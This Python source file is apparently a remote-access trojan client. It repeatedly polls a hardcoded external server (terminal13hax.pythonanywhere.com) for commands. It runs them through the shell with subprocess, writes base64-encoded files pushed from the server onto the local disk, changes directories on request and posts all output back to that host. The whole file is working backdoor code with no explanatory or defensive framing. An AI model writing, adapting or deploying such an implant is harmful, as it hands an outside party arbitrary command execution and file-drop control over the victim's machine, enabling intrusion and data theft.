import base64
import json
import os
import subprocess

import requests

url = "http://terminal13hax.pythonanywhere.com/api/"

state = {
    'old_command' : ''
}

def send_result(url, payload):
    requests.post(url, data=payload)

def get_request():
    raw_response = requests.get(url)
    response = json.loads(raw_response.text)

    command = response['result']
    command = str(command)

    state['old_command'] = command


def cd(path):
    os.chdir(path)

def write_files(path, content):
    with open(path, 'wb') as file:
        file.write(base64.b64decode(content))

def exe_command(command, file_name, content):
    command = command.split(" ")

    try:
        if command[0] == "cd" and len(command) > 1:
            result = cd(command[1])
            send_result(url, {'result': os.getcwd()})

        elif command[0] == "upload":
            write_files(file_name, content)
            send_result(url, {'result': "[+] File downloaded successfully"})

        else:
            exe_result = subprocess.check_output(command, shell=True)
            exe_result = exe_result.decode()
            data = {
                'result': exe_result
            }
            send_result(url, data)
    
    except:
        exe_result = "[!] Error occured"
        data = {
            'result': exe_result
        }
        send_result(url, data)

def update_checker():
    while True:
        raw_response = requests.get(url)
        response = json.loads(raw_response.text)

        new_command = str(response['result'])
        file_name = str(response['file_name'])
        content = response['content']

        if new_command == "OFF":
            break

        if new_command != state['old_command']:
            exe_command(new_command, file_name, content)
            print(new_command)
            # print("[*] New command detected")
            state['old_command'] = new_command

        else:
            # print("[*] Same command")
            print(new_command)
            continue

get_request()
print(state)
update_checker()


